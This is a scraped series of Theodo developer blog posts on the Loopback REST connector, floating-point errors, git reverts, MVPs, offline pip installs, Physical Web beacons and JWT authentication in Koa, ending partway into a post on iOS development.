<img src=""data:image/png;base64,{{encodedImage}}"" .../>

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Richard Casetta
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										 
I had a lot of trouble using the Loopback REST connector reading the existing documentation and I’m sure you’ll have less issues by reading this first.
Summary
This article will show how to:

Use API methods from your server
Use environment variables for production
Get values from the headers of a response
Customize the error handling of the connector

A Loopback connector connects a Loopback datasource to your DB (mongo, postgreSQL, etc) or to a REST API.
It can be very useful when you want to separate your logic in microservices, or if you want to access an API from the server.
Get started
The Loopback-connector-rest works this way:

Create a model MyAPI that will contain all the methods that use the API
Your model is connected to a dataSource APIDataSource
This dataSource is connected to your API through the Loopback-connector-rest

Add the model
In your model-config.json add the following:

""MyAPI"": {
  ""dataSource"": ""APIDataSource"",
  ""public"": true
}

and in your common/models/MyAPI.json:

{
  ""name"": ""myAPI"",
  ""plural"": ""myAPI"",
  ""base"": ""Model"",
  ""idInjection"": false,
  ""properties"": {},
  ""options"": {
    ""promisify"": true
  },
  ""acls"": [],
  ""methods"": []
}

Create your dataSource
in your datasource.json

""APIDataSource"": {
  ""connector"": ""rest"",
  ""name"": ""restAPI"",
  ""operations"": []
}

At this point your model myAPI contains nothing.
Your server can’t even start until you’ve installed the Loopback-connector-rest.

npm install loopback-connector-rest --save

Alright you are ready to build your first method!
At first, I thought that I would need a file with module.exports = (MyAPI) -> to contain all my methods.
No such things with the REST connector.
I would clearly advise not to write any methods in this model so it is exclusively designed to call the API end-point and nothing else.
Whenever you need to add some logic, do it in your others models.
The API
To start playing with an API, you need an API. You can install this dumb-api.
Once you’ve installed the dumb-api, launch the server, take a look at it http://0.0.0.0:3000/explorer/#.
There are a lot of methods, we will focus on the main four, the CRUD (Create, Read, Update, Delete):

POST /stuff
GET /stuff
PUT /stuff/{id}
DELETE /stuff/{id}

The GET method
The GET is the easiest one.
What you want to do is to call the getStuff method of our API from another model OtherModel and log the result in the console.
This should look like the following:

OtherModel.app.models.MyAPI.getStuff()
.then(function (result) {
  console.log(result)
  })

At this point, this won’t do anything because MyAPI.getStuff doesn’t exist.
Let’s create it.
How would you usually export a method on a Loopback model?

module.exports = function(MyAPI) {
  return MyAPI.getStuff = function() {
    return stuff;
  };
};

Well, you won’t write any of this… Delete it! The Loopback-connector-rest writes the methods itself, with a little bit of configuration.
The Loopback-connector-rest works with operations. An operation contains two keys, the first being:

The functions: it contains your methods and describes the signature of your methods

So let’s add a function in the datasources.json by creating a new operation.

""APIDataSource"": {
  ""connector"": ""rest"",
  ""name"": ""restAPI"",
  ""operations"": [
    {
      ""functions"": {
        ""getStuff"": []
      }
    }
  ]
}

Now you have a method of MyAPI that takes 0 arguments.
What does this function return?
It returns the body of the response of the request you call.
You define this request in the second key of the operation: the template.
You need:

A method: GET, POST, etc
A url: Click on try it out on the explorer, the url is in ‘Request URL’


""APIDataSource"": {
  ""connector"": ""rest"",
  ""name"": ""restAPI"",
  ""operations"": [
    {
      ""functions"": {
        ""getStuff"": []
      },
      ""template"": {
        ""method"": ""GET"",
        ""url"": ""http://0.0.0.0:3000/api/Stuff""
      }
    }
  ]
}

And that’s it, now when you call OtherModel.app.models.MyAPI.getStuff() you will get a promise with the response body of the request!
And the response will be an empty array… That’s because there is no stuff yet in your dumb-api. Let’s create one.
The POST method
You want to be able to create new stuff from our server.

var newStuff = {
  id: 1,
  thing: 'my new stuff'
};
OtherModel.app.models.MyAPI.postStuff(newStuff)

Let’s create a new operation with a function called postStuff using one argument newStuff.

{
  ""functions"": {
    ""postStuff"": [""newStuff""]
  }
}

Then you configure the request by adding a body.

{
  ""functions"": {
    ""postStuff"": [""newStuff""]
  },
  ""template"": {
    ""method"": ""POST"",
    ""url"": ""http://0.0.0.0:3000/api/Stuff"",
    ""body"": ""{newStuff}""
  }
}

For safety reasons, you can specify the type of this new argument which is an object.

""body"": ""{newStuff:object}""

Or, to detect easily why the requests wouldn’t work, you can specify each of the parameters of the POST

{
  ""functions"": {
    ""postStuff"": [""newStuffId"", ""newStuffThing""]
  },
  ""template"": {
    ""method"": ""POST"",
    ""url"": ""http://0.0.0.0:3000/api/Stuff"",
    ""body"": {
      ""id"": ""{newStuffId:integer}"",
      ""thing"": ""{newStuffThing:string}""
    }
  }
}

Finally call the method with:

OtherModel.app.models.MyAPI.postStuff(1, 'my new stuff')

PUT and DELETE methods
For the PUT method you need the id inside your URL.

{
  ""functions"": {
    ""putStuff"": [""updatedStuffId"", ""updatedStuffThing""]
  },
  ""template"": {
    ""method"": ""PUT"",
    ""url"": ""http://0.0.0.0:3000/api/Stuff/{updatedStuffId:integer}"",
    ""body"": {
      ""id"": ""{updatedStuffId:integer}"",
      ""thing"": ""{updatedStuffThing:string}""
    }
  }
}

To give you an example, if you need to be authenticated to your API for a DELETE, you might need to add a token and a userId in the header of your request.

{
  ""functions"": {
    ""deleteStuff"": [""userId"", ""token"", ""stuffId""]
  },
  ""template"": {
    ""method"": ""DELETE"",
    ""url"": ""http://0.0.0.0:3000/api/Stuff/{StuffId:integer}"",
    ""headers"": {
      ""authentication"": ""{token:string}"",
      ""userId"": ""{userId:string}""
    }
  }
}

Use the Debug
When developing with the Loopback-connector-rest, the requests and responses are quite magic.
If you want to monitor the activity of the connector use the debug mode.
bash
DEBUG=* node server/server.js

If you want to display only the logs from the REST connector:
bash
DEBUG=*rest node server/server.js

Environment variables for production
For different environments you might have different urls for your API.
The datasources.local.js file enables to use local environment variables to configure your connectors.
For instance, on your dev machine we use http://0.0.0.0:3000/api/ and on the production http://prod.api:3000/api/.
You should export this on your production machine:
bash
export LOCAL_API_URL=http://prod.api:3000/api/

in your datasource.local.js file, every url should look like this:

url: (process.env.LOCAL_API_URL || ""http://0.0.0.0:3000/api/"") + ""Stuff/{StuffId:integer}""

And if you have an API version, you should separate the url and the version:
bash
export LOCAL_API_URL=http://prod.api:3000/
export LOCAL_API_VERSION=api/v1.0/


url: (process.env.LOCAL_API_URL + process.env.LOCAL_API_VERSION || ""http://0.0.0.0:3000/api/"") + ""Stuff/{StuffId:integer}""

Access the headers of a request
The Loopback-connector-rest works fine returning the body of the response.
But when it comes to access other part of the response, it gets tricky.
For instance, in my case, I wanted to update a list of stuff after a POST request.
The request to get the whole list of stuff was really long, so the only way for us was to get the last, newly created item.
In most cases, the POST request returns the new item and the connector works fine.
The API I was working with responded with a code 200 and an empty body after a successful creation.
However, they where sending the location of new item in the response’s headers, where the id can be found.

""location"": ""http://0.0.0.0:3000/api/Stuff/stuffId""

So I needed to access the request’s headers and put the stuffID it in the body to be able use it.
Hooks
If you are a Loopback user you might have heard of the operations hooks.
Hooks are functions that are triggered every time an operation is done, such as:

Before a CREATE operation
After a DELETE

I quote the documentation:
A typical request to invoke a LoopBack model method travels through multiple layers with chains of asynchronous callbacks. It’s not always possible to pass all the information through method parameters.>
A hook gives you access to the Loopback context ctx of the operation which contains a lot of information that won’t make it to the end of your method.
Typically: in the end of a call you get the body of the response, the headers are only available in the ctx.
In many case the hook is the .observe method of the model.
In our case this won’t work.
You have to use the hook of the connector itself.
And where do you access the connector object? During the boot!
So you are going to need a new file in the boot.
in server/boot/set-headers-in-body.js

module.exports = function(server) {
  var APIConnector;
  APIConnector = server.datasources.APIDataSource.connector;
  return APIConnector.observe('after execute', function(ctx, next) {

  });
};

Now inside this function you have access to every information you need:

the headers of the response: ctx.res.headers
the code of the response: ctx.res.body.code
the method of our request: ctx.req.method

Remember, the hook is called every time the operation is done, the operation is a call to the connector, so each of your requests with the rest-connector will go through this function.
If you try the code now, every call to the API won’t go through this hook because you are not calling the next() function yet.
You want to hook every POST request our server does and put the location from the header inside the body.

module.exports = function(server) {
  var APIConnector;
  APIConnector = server.datasources.APIDataSource.connector;
  return APIConnector.observe('after execute', function(ctx, next) {
    if (ctx.req.method === 'POST') {
      ctx.res.body.location = ctx.res.headers.location;
      return ctx.end(null, ctx, ctx.res.body);
    } else {
      return next();
    }
  });
};

The ctx.end method needs 3 arguments: (err, ctx, result). The result is what is send in the end, when the method of MyAPI is called.
Warning: be careful with hooks.
With the code you just wrote, the connector never sends any errors after a POST request for instance.
A way to avoid most bugs is to specify in which case you touch the ctx:

if (ctx.req.method === 'POST' && ((ref = ctx.res) != null ? (ref1 = ref.body) != null ? ref1.code : void 0 : void 0) === 200 && ctx.res.headers.location)

Error handling
There can be many use of hooks, such as formatting every response you get from the API, very usefull when you work with an API that returns xml for instance.
Or handle errors from the API before it comes to your model inside your promise.
In my last project, the API was a gateway, so every error they sent was a HTTP error 502 Bad Gateway when it should have been 403 Forbidden.
In order not to be confused with our server errors and the gateway errors, we customized the error rejection in the hook.

module.exports = function(server) {
  var APIConnector;
  APIConnector = server.datasources.APIDataSource.connector;
  return APIConnector.observe('after execute', function(ctx, next) {
    var err, ref, ref1;
    if (/^[5]/.test((ref = ctx.res) != null ? (ref1 = ref.body) != null ? ref1.code : void 0 : void 0)) {
      err = new Error('Error from the API');
      err.status = 403;
      err.message = ctx.res.body.message;
      return ctx.end(err, ctx, ctx.res.body);
    } else {
      return next();
    }
  });
};

Conclusion
I wanted to share the knowledge I acquired using this connector with a tutorial.
I’m using Loopback v2.22.2, if you had trouble understanding/implementing any part of this article or if you have some improvement to suggest, please contact me through the comments!
And remember: always use the DEBUG=*rest when you work with the connector!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Sammy Teillet
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Floats
We use computers every day to solve mathematical issues, from how much taxes should I apply to my users’ basket to computing next week’s weather forecast.
Solving most of those problems is nowhere near easy, and would be harder still if we didn’t use mathematics to reason, represent and compute insane amounts of data.
But the code we execute on our computers isn’t exactly the same as the doing the maths we try to represent.
For instance, the plus operator does not yield the same results as a real addition.
Don’t believe me? Run 0.1 + 0.2 on the javascript console of the browser you are using to read this article.
Spoiler alert: you won’t get 0.3 (if you do, let me know which browser you are using).
Isn’t this a JS issue ?
This issue comes from how computers represent decimal numbers, you could try doing the same addition with python, C… and the result would be 0.30000000000000004.
This rounding error is caused, deep down, by the fact that our computer only can store a finite amount of data (ref. needed) when there is an infinite amount of decimal numbers (ref. needed).
A solution ?
Some languages, like PHP (tested with PHP 5.5.14) will actually return 0.3 for 0.1 + 0.2.
In this case do we really have a solution? Were PHP developers able to solve this problem many other languages developers failed to? Of course not, the result was simply rounded, which can be made apparent by running some other cleverly crafted additions:
For example 0.30000000000000004 - 0.3 would yield 5.55111512313e-17 When 0.30000000000000004 - (0.1 + 0.2) would yield 0
A matter of floats and death
One could argue that, to display the taxes amount on an amazon basket, rounding to two digits would be more than enough (on all the monetary systems I know of), and a 0.00000000000004 error on the displayed amount would be of little to no consequence.

Floats are a deadly issue, literally. See the Patriot Missile Failure on February 25, 1991, which caused the death of 28 soldiers. The main cause for that failure was that 0.1 is not a round number, as far as floats are concerned.
So yes, the gap between the mathematics we use to reason about software and its implementation can be a problem, and a deadly one.
How can we solve this
Some of those problems have been solved on some languages using rational arithmetic instead of floating point arithmetic.
Using rational arithmetic does have a performance (both in terms of CPU and memory) impact, and does not solve all rounding errors (specially with irrational numbers).
The only solution I can recommend is to always assume that a floating point operation is inexact and be ready to handle the consequences, which means:

Not using the equality operator with floats, ever
Always round/floor/whatever the result you display to the user (no one wants to see 5.55111512313e-17°C appear as the tomorrow’s temperature)
Avoid using floats altogether if possible (for example, one could use integers to represent cents instead of float value for dollars, euros or any other currency that could have decimal values)

Some more shenanigans
As we’ve seen, the implemented operators does not yield the same results as their mathematical counterparts, and they also does not share the same properties.

The + is not associative (with and associative operator, a + (b + c) = (a + b) + c)
The == (equality) is not transitive (if it was, that would mean that if a == b and b == c then a == c)
The == does not even have to be reflexive (by design in C)


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Clément Hannicq
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Let me tell you my story about git, conflicts and reverts.
On a project, I start a feature on a branch, open a pull request towards master branch and merge it by mistake before finishing my code.
No git story would be complete without drawings.

Oops!
What is the clean way to fix my mistake?
My first idea is to quickly push --force to master branch to cancel the merge when nobody is looking.
I read on the Internet that this is a bad idea on a shared branch.
Therefore, I decide to do it the “clean way”, which in my case is revert.
I can revert manually on the command-line, or thanks to GitHub directly from the merged pull-request!

My git history now looks like this:

Now is the time to deploy my code.
I can’t merge my feature, what’s going on?
I’ve added my missing commit, I reopen a pull request and see this on GitHub:

How does a merge commit work?
A merge commit takes the diff between the common ancestor and the first parent commit and the diff between the common ancestor and the second parent commit and applies them together.

Let’s look at my git history:

Now suppose my feature introduced a new file script.sh, and that I modified it in my feature branch after the revert.
Let’s see what this means:

That’s great!
I understand that the revert commit is the culprit here.
But how do I get back on my feet and merge my feature?
Solution: revert the revert!
I want to avoid the revert commit in my merge, therefore I rebase my feature branch on master branch so that the merge commit common ancestor is after the revert commit.

I can’t apply my feature commit on master branch because script.sh does not exist.
I need a commit before that reinstates script.sh and that is not already merged into master branch.
That’s where the magic occurs, I revert the revert commit, and then cherry-pick my new commit.
Let’s see this in action:

It’s working, at last!
Epilogue
This solution requires a good visualization of the situation to understand and implement it.
Always draw when you have a problem with git.
The best way to avoid all this work is to avoid the mistake in the first place:
be careful when merging your pull requests.
I rejected the push force method because it is dangerous, but my solution is quite thorny!
There are situations where push force is indeed a good choice, even on a shared branch.
Be sure to warn your collaborators and explain to them the necessary steps to recover from it if needed.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Tristan Roussel
  			
  				After graduating from l'École Normale Supérieure in mathematics, Tristan explored various jobs: trading, theoretical research in computer science, data analysis and business development. He finally found his way at Theodo in 2013 as a web developer-architect. He works mainly with Symfony and front-end JavaScript frameworks, and is particularly fond of git.  			
  		
    
			

									"
"
										At Theodo, we build products everyday for our clients and for ourselves. We often deal with creating a Minimum Viable Product or MVP. But what is a MVP? How do you build a good one?  Why is it useful?
MVP? 
When people talk about building a product, you often hear about POCs (proof of concept) or MVPs. But you may not know what it really means. If you are an entrepreneur with an idea, you first want to know if it solves a problem that matters to people. After that and if your idea does solve a problem worth solving, you want to know how you can address this problem in the most effective way. For that you can build a MVP.
Your MVP is not the product with the least number of features, nor is it the product with all the features half developed
The goal of the MVP is to build the first version of your product so you can get feedbacks from customers and improve it. Your MVP is not the product with the least number of features, nor is it the product with all the features half developed. Even if you have a lot of features in mind, your MVP should have the one feature that solves the problem and it should work flawlessly. The pyramids illustrates this clearly.

If you read Eric Ries’s Lean Startup, there are some great examples of MVP, like Food-On-The-Table: “The company did the menu-planning by hand, and they met the customer in person once a week in the Starbucks in a parking lot of the grocery store where that person did their shopping. The customer had no idea that they were the only customer or the first customer. But they learned how to serve that customer and were able to get several other customers before they invested in automation.” First they try to serve their customer effectively, not to make it automated. 
I have a great idea, what do I need to build a MVP?
Feedbacks. Always get feedbacks. We had one client at Theodo who wanted to launch its startup and wanted to build its MVP to raise money. The first time we met him, he couldn’t give us any feedbacks about his future customers. You can get feedbacks even without a product built. Remember: your idea solves a problem. Which one is it? How do you want to address it? How do your customers react to your idea? Will they use your product? If not, why? If so, how do they intend to use it? You must be able to answer all these questions before starting your MVP. Keep in mind that the more you have feedbacks from your customers, the more you know how to solve their problem.
How do I build it?
At Theodo we build web applications. In my projects, I’ve learnt that an easy way to build a product is to visualize it. When the customer uses your product, he wants to find one thing: the solution you propose to his problem. To build your MVP, you can visualize all the necessary steps to solve this problem. For example, you can print wireframes of the needed pages of these steps and hang them on a wall. 
Two months ago, I had to build a marketplace for winter sports. Our client wanted us to spend a lot of time on a shiny homepage. We decided to print the different steps needed for his product to work : one user should be able to find the sport he or she wants, book it and get in touch with the coach who is providing the lesson. Our client understood immediately that the goal of his MVP was to make this user flow as efficient as possible. 
Building a MVP gives you the tools to adapt your product design to what the customer really needs. So next time you want to build one, don’t forget: get feedbacks, focus on solving one specific problem and follow the MVP pyramid!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Damien Peltier
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Recently, we had to migrate our 22 Flask micro-services to new servers.
As automatic deployment was implemented for all of these, we thought it would be done in a glimpse.
What a surprise when we connected to the servers and realized that they were totally isolated from the internet!
No git clone, no git submodule update, no pip install, even virtualenv was failing…
So we rolled up our sleeves and iterated to create a new automated process.
Dealing with pip packages
Our first attempt was to commit our entire virtualenv, like we would do with the node_modules in a Node.js app.
The issue with this method is that the paths in the bin/activate are hard coded, which brought errors when using it.
We then decided to download our pip packages without installing them to realize an offline installation directly on the server.
Using a requirements file, we simply used the download options of pip:
pip download -r requirements.txt -d <PATH_FOR_PACKAGES>
We then zipped our source code (including our git submodules) to send it on the server through a ftp connection.
Setting up virtualenv
After that, we had to set our virtualenv.
Its default behaviour is to download preinstalled packages (pip, setuptools and wheels) from the internet.
We set the --no-download option to prevent this to happen.
As our app was using Python3 and the default version was Python2, we had to precise its path to virtualenv:
virtualenv --no-download venv -p <PATH_TO_PYTHON_3>
We were then able to install our dependencies using the committed packages!
pip3 install --no-index --find-links pip_installs/ -r requirements.txt
Tougher packages
Some python packages (like pandas) are downloading other packages themselves during their installation.
We were able to bypass this problem installing the required packages before.
For example, Pandas was downloading Cython and numpy during its installation:
pip3 install Cython==0.25.1 --no-index --find-links pip_installs/
pip3 install numpy==1.11.2 --no-index --find-links pip_installs/
pip3 install --no-index --find-links pip_installs/ -r requirements.txt
I hope this article will help people in a similar situation, please feel free to give feedback!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Ngô-Maï
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										
Physical Web, what is that?
In 2016, there are 42 billion devices connected worldwide. Glasses, gates, clocks, padlocks, connected thermostats and many others are now part of our everyday environment. Today, the only way to access their functionality is to develop a specific application (mobile, web) for each single object. But this solution cannot scale to the amazing growth of connected devices.
The core premise of the Physical Web is to bring the power of the Internet and web to interactions in the physical world. With the Physical Web, people would be able to walk up to any smart device be it a movie poster, a vending machine, a bus stop, a billboard or any other physical object and receive relevant content straight on their smartphones.
How to create and broadcast a nodejs app
Prerequisites

A computer with a Bluetooth 4.0 adapter
A phone with a Bluetooth 4.0 adapter
Google Chrome on your phone (for the moment that’s the only browser who supports the physical web)

To do so, let’s configure our phone to enable the physical web. For doing this, go in your Chrome browser, Settings > Privacy > Physical web > On. Here you are, your phone is ready for the physical web world.

Keep this page in mind, we will need it later in this tutorial, in order to scan our physical environment.
First of all, let’s start by creating a simple app. We are going to use an express app generator like that we can create easily a good start.
sudo npm install express-generator -g
express MyBeacon
cd MyBeacon
npm install
We are ready to use our app:
npm start
If all has gone well so far, we should see our app on localhost:3000
Create a beacon
A beacon!? What is that? A beacon is an URL broadcaster that creates a link between our physical world and the Web. In order to do so, beacons take advantage of Bluetooth Low Energy (BLE). There are severals protocols based on BLE. In this tutorial we are going to use Eddystone, an open-source protocol which works with android and iOS.
There are some prerequisites to make the protocol work on our computer: https://github.com/sandeepmistry/bleno#prerequisites
Done? Good, let’s add a npm module to create node js beacon:
npm install eddystone-beacon
Let’s add those lines to our app.js to create the first github beacon. Add these lines to our app.js file to broadcast github url:
//app.js

var eddystoneBeacon = require('eddystone-beacon');

var options = {
    name: 'Beacon',    // set device name when advertising (Linux only)
    txPowerLevel: -22, // override TX Power Level, default value is -21,
    tlmCount: 2,       // 2 TLM frames
    tlmPeriod: 10      // every 10 advertisements
};

eddystoneBeacon.advertiseUrl('https://github.com/', [options]);
Start our app:
npm start
If all is going good, you should see an error message like this one:
bleno warning: adapter state unauthorized,
please run as root or with sudo
The issue is that our bleutooth adapter is only accessible by the system admin. Run the script with sudo right:
sudo npm start
To see our beacon, go on our phone and start a physical web scan on the Google Chrome scanner (Settings > Privacy > physical web > See what’s nearby)
… and tadaaa.

Broadcast our local app
Let’s broadcast our local application URL. For security reasons,Chrome physical web scanner does not authorize non-HTTPS urls. We are going to use ngrok to expose our local application on an https server.
npm install ngrok
We will add the promise package, because we need to wait for ngrok https url creation before broadcasting it:
npm install promise
And now let’s launch ngrock on the app start:
//app.js

var ngrok = require('ngrok');
var Promise = require('promise');

new Promise(function(resolve, reject) {
    ngrok.connect(3000, function (err, url) {
        if (err) {
            console.log(""## NGROK : Error gate"");
            reject(err);
        }
        if (url) {
            console.log(""## NGROK : Gate to port 3000 created"");
            resolve(url);
        }
    });
})
.then(url => {
    console.log(""## PROMISE : App available on "" + url);
    eddystoneBeacon.advertiseUrl(url, [options]);
})
.catch(err => {
    console.log(""## PROMISE : "" + err);
})
Now we can run our application and go to back to chrome to scan our environment … and it’s aaaaaaaaaalive!

Conclusion

 
Now, you know how to broadcast an application through bluetooth. In the next article, we will see how to optimize our website for physical web notifications and how to interact with the beacon using the web API bluetooth.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Kévin Jean
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Koa is the “new” all the rage framework used with NodeJS. This guide aims at explaining how to set up efficiently an API protected with a JWT token.
What we want to have at the end of this tutorial is an API protected from unauthenticated users.
We will use a JWT token to authenticate our users.
What is JWT? Why should we use it?
JWT stands for JSON web token. It is a standard token designed to exchange secured information and is mainly used for authentication purposes. JSON web tokens are small sized which allows them to be sent:

through a URL
a POST parameter
inside a HTTP header.

They are composed of three different parts separated by a dot:

Header: contains typically the hashing algorithm used and the type of the token which is JWT.
Payload: the information you want to exchange with the token. Could be the user id and its role for example in the case of an authentication token.
Signature: is used to verify the authenticity of the token. The signature is generated using the header, the payload and a secret. It can thus be used to check that the payload has not been altered.

A classic JWT token looks like the following: <header>.<payload>.<signature>
In an authentication scenario, JWT tokens are used in the following way:

the user sends a login request with his credentials
the server authenticate the user
the server creates a token containing some information to recognise the user in the future
the server signs the token
the server sends the token back to the user
the user stores the token in the locale storage or in the cookies.

On his next requests:

the user sends the token in the header so that the server can identify him.
the server decodes the token to read the payload which can be used to identify the user
the server treats his request.

The user can’t change the payload of his token to usurp the identity of another user. The payload is indeed used to generate the signature and an altered token will not be recognised as valid by the server.
JWT tokens for authentication have the main advantage to not require session. The token is like an access card and it is the user who stores it, usually in a cookie or locale storage. The backend does not keep any tracks of the issued tokens.
The secret is not shared with the user, it is only stored on the server which makes it less likely to be cracked.
JSON web tokens are also way smaller than SAML tokens which are their XML equivalent. It makes them a better choice to be passed in HTML and HTTP environments.
One drawback of using JWT is that a malicious user can make requests on someone else’s name if he managed to find a valid token. That is the reason why it is important to use SSL to protect the token that will be sent on every request.
Set up: our unprotected API
All the code is available at https://github.com/Theodo-UK/blog-koa-jwt
In this guide we will use an API with one entity and two methods available (GET and POST). Another endpoint will be created later on to allow users to log in. Here is a code sample for an unprotected API using koa, koa-router and koa-better-body to facilitate the parsing of the request. Note that the requests are expected to have a content type application/json.
//index.js

const app = require('koa')();
const router = require('koa-router')();
const koaBetterBody = require('koa-better-body');

const customerService = require('./services/customerService');

app.use(koaBetterBody({fields: 'body'}));

router.get('/customer', function *(next) {
  this.body = customerService.getCustomers();
});

router.get('/customer/:id', function *(next) {
  if (customerService.getCustomer(this.params.id)) {
    this.body = customerService.getCustomer(this.params.id);
  }
  else {
    this.status = 404;
    this.body = {""error"": ""There is no customer with that id""};
  }
});

router.post('/customer', function *(next) {
  this.body = customerService.postCustomer(this.request.body);
});

app
  .use(router.routes())
  .use(router.allowedMethods());

app.listen(3000);


Here the customerService is supposed to make the link between the API and the database. For the purpose of this example, this service is simply managing a javascript object containing the list of our customers as you can see below:
//services/customerService.js

const customers = [
  {
    ""id"": 1,
    ""first_name"": ""John"",
    ""last_name"": ""Smith"",
    ""date_of_birth"": ""1993-04-23T00:00:00.000Z""
  },
  {
    ""id"": 2,
    ""first_name"": ""Justin"",
    ""last_name"": ""Bieber"",
    ""date_of_birth"": ""1994-04-23T00:00:00.000Z""
  }
];

let maxId = 2;

module.exports = {
  getCustomers: function() {
    return customers;
  },
  getCustomer: function(id) {
    return customers.find(customer => customer.id === parseInt(id) || customer.id === id);
  },
  postCustomer: function(customer) {
    maxId++;
    customer.id = maxId;
    customers.push(customer);
    return this.getCustomer(maxId);
  }
}

With this code you should be able to call your API to get the list of customers and post new ones. For the moment, anyone can call the API but you probably want to restrict your API to authenticated users only. In the following section, we will see how to protect the POST endpoint from unauthenticated users.
1st step: protect your API
We want to protect the API using JWT tokens, and for that we will use a middleware called koa-jwt. You can add this new file to your app to set up the middleware with your secret key:
//middlewares/jwt.js

const koaJwt = require('koa-jwt');

module.exports = koaJwt({
  secret: 'A very secret key', // Should not be hardcoded
});

The secret key should not be hardcoded but instead you can use an environment variable. Note that it is possible to use different secret key depending on the endpoint you are protecting for example. It is even possible to have different secret keys for each of your users.
You can now import the middleware in you main file:
//index.js

const jwt = require('./middlewares/jwt');

It is then really easy to protect a specific endpoint, you just have to add the middleware to the stack of middlewares called by the endpoint, for example for our POST endpoint becomes:
//index.js

router.post('/customer', jwt, function *(next) {
  this.body = customerService.postCustomer(this.request.body);
});

If you now try to call this protected endpoint you should receive an error 401 with the message: “No Authorization header found”. What is actually happening is that the jwt middleware checks if the request has the required authentication header, and if not, stops the stack of middleware and returns a 401.
You could try to add the jwt middleware earlier in the stack of middleware, then you would not be able to access any of the middlewares called afterwards. For example, if you add app.use(jwt); before declaring the first endpoint, none of the endpoints are accessible.
Now that one of your endpoint is protected, it would be nice to be able to allow user authentication.
2nd step: create a login endpoint and mechanism in the API
First we need to create a new endpoint that has to be unprotected. Let’s add the following code before the first call to jwt:
//index.js

router.post('/login', function *(next) {
  authenticate(this);
});

And import the new authenticate middleware const authenticate = require('./middlewares/authenticate.js');
The authenticate middleware is the one in charge of the login mechanism. This is where you will check the credentials and also where you will create the jwt token if the credentials are valid.
//middlewares/authenticate.js

const jwt = require('koa-jwt');

module.exports = function (ctx) {
  if (ctx.request.body.password === 'password') {
    ctx.status = 200;
    ctx.body = {
      token: jwt.sign({ role: 'admin' }, 'A very secret key'), //Should be the same secret key as the one used is ./jwt.js
      message: ""Successfully logged in!""
    };
  } else {
    ctx.status = ctx.status = 401;
    ctx.body = {
      message: ""Authentication failed""
    };
  }
  return ctx;
}

This middleware is quite simple, it:

checks that the password sent with the request is the right one
in that case returns the jwt token in the body of the answer.

In that example the token contains only one attribute role set as admin for anyone. The token is then signed using the same secret key than the one used to decode the token defined in middlewares/jwt.js. In the case of bad credentials, the middleware simply return a 401 with a message.
You can now access the protected endpoints by adding the jwt token in the request Authorization header: Bearer <token>.
Conclusion
You now have a ready to go protected api with a simple authentication mechanism! Enjoy!
 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Bruno Godefroy
  			
  				Developer at Theodo UK  			
  		
    
			

									"
"
										J’ai rencontré Sébastien Tanguy, co-fondateur de Testapic, au canada durant le WAQ 2016. Nous faisions tout les deux partie de la délégation française à décoller pour la semaine du numérique du Québec. J’ai eu l’occasion d’assister à sa conférence au WAQ sur les tests utilisateurs physiques et distants. C’était l’un des talks les plus formateurs de ces 3 jours de conférences !
Les sketchnotes de Céline Rouquié résument très bien le talk de Sébastien.
Tests utilisateurs physiques et distants : résumé en sketch de la conférence @testapic #WAQ16 pic.twitter.com/0hEnoZohnX
— Céline Rouquié (@CelineRouquie) April 6, 2016

Comme nous, Testapic place l’utilisateur au centre de la conception d’une application, alors à notre retour à Paris, j’ai demandé à Sébastien s’il pouvait partager avec nous son expérience. Voici la vidéo du Brown Bag Lunch à Theodo :

En bonus, Sébastien nous partage 6 conseils sur les tests utilisateurs.
“Testapic, créée en 2011 par 4 passionnés du Web, du design et de la conversion, est l’expert français du test utilisateur distant. Nous plaçons l’utilisateur au centre de la démarche de conception (ergonomie et UX) et d’optimisation sur des interfaces web et mobile (web mobile ou natif) en production (conversion). Testapic réalise des tests quantitatifs mais aussi qualitatifs, avec des tests vidéos commentées sur ordinateur, smartphone et tablette à partir d’un panel de +100 000 utilisateurs qualifiés et représentatifs des internautes français.
Voici quelques conseils :

Sachez ce que vous voulez tester : définissez un cadrage et formalisez les objectifs et les hypothèses de test
Adressez un public cible précis : Mme Michu n’existe pas… Mieux vaut tester des personas identifiés et ciblés
Faites appel à des professionnels du test pour les réaliser : que ce soit en présentiel ou à distance, il n’y aurait rien de pire que de biaiser un test en le réalisant soit même sans avoir conscience des biais ou limites éventuelles
Analysez de façon structurée avec des métriques fiables. Cela présuppose de savoir quoi mesurer et de le mesurer convenablement.
Formalisez de façon objective les conclusions en les appuyant sur des données utilisateurs irréfutables
Sachez communiquer les résultats en fonction de l’audience : opérationnels et top managers ne s’attendent pas au même niveau de détail

Enfin dernier conseil pour structurer votre approche de user test :
Constatez, testez, analysez, corrigez, testez, … #rouededeming”
Merci beaucoup Sébastien.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jonathan Beurel
  			
  				Jonathan Beurel - Web Developer. Twitter : @jonathanbeurel  			
  		
    
			

									"
"
										Unfortunately there’s no way* to develop an iOS app without a Mac.
Fortunately that doesn’t mean you need to switch to a Macbook, there is another way.
*No legal way.
